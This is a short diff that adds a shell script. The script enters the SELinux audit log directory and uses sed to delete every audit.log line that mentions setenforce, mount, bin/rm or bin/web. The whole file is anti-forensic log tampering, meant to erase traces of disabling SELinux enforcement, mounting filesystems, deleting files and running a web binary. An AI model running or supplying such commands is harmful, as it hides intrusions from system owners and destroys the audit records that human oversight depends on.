@@ -1,0 +1,8 @@
+# Navigate to the SELinux audit log directory
+cd /data/var/log/audit/
+
+# Remove specific executed commands from the audit log
+sed -i '/bin\/web/d' audit.log
+sed -i '/setenforce/d' audit.log
+sed -i '/mount/d' audit.log
+sed -i '/bin\/rm/d' audit.log
